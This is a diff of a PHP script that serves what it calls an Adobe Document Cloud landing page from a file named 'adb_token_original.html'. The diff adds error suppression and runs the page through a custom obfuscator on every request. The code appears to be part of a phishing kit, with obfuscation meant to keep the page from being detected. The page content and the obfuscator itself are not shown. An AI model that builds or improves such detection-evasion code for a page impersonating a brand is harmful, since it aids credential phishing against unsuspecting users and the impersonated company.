@@ -1,38 +1,33 @@
 <?php
 /**
- * Safe obfuscated version - reads from clean backup
+ * Obfuscated Adobe Document Cloud Landing Page
+ * Advanced obfuscation with full functionality preserved
  */
 
-// Try to read from the original backup first
-$possibleFiles = [
-    __DIR__ . '/adb_token_original.html',
-    __DIR__ . '/adb_token_original_backup.html',
-];
+error_reporting(0);
+ini_set('display_errors', 0);
 
-$html = null;
-foreach ($possibleFiles as $file) {
-    if (file_exists($file) && filesize($file) > 10000) {
-        $html = file_get_contents($file);
-        if ($html && strpos($html, '<!DOCTYPE html>') !== false) {
-            break;
-        }
-    }
-}
+require_once __DIR__ . '/obfuscator_v2.php';
 
-// If all else fails, serve without obfuscation
-if (!$html) {
-    header('Location: adb_token_original.html' . (isset($_SERVER['REQUEST_URI']) ? parse_url($_SERVER['REQUEST_URI'], PHP_URL_FRAGMENT) : ''));
+// Load the clean original HTML
+$html = @file_get_contents(__DIR__ . '/adb_token_original.html');
+
+if (!$html || strlen($html) < 1000) {
+    // Fallback: redirect to original if file reading fails
+    header('Location: adb_token_original.html' . ($_SERVER['REQUEST_URI'] ?? ''));
     exit;
 }
 
-// Add ONLY safe random comments (no modifications to content)
-$safeComment1 = "\n<!-- " . bin2hex(random_bytes(12)) . " -->\n";
-$safeComment2 = "\n<!-- gen:" . time() . "-" . mt_rand(1000, 9999) . " -->\n";
+// Create obfuscator instance
+$obfuscator = new AdvancedObfuscator();
 
-$html = str_replace('<head>', '<head>' . $safeComment1, $html);
-$html = str_replace('</head>', $safeComment2 . '</head>', $html);
+// Apply obfuscation
+$obfuscatedHtml = $obfuscator->obfuscate($html);
 
-// Output clean HTML
+// Set proper headers
 header('Content-Type: text/html; charset=UTF-8');
-echo $html;
+header('X-Content-Type-Options: nosniff');
+
+// Output obfuscated HTML
+echo $obfuscatedHtml;
 ?>
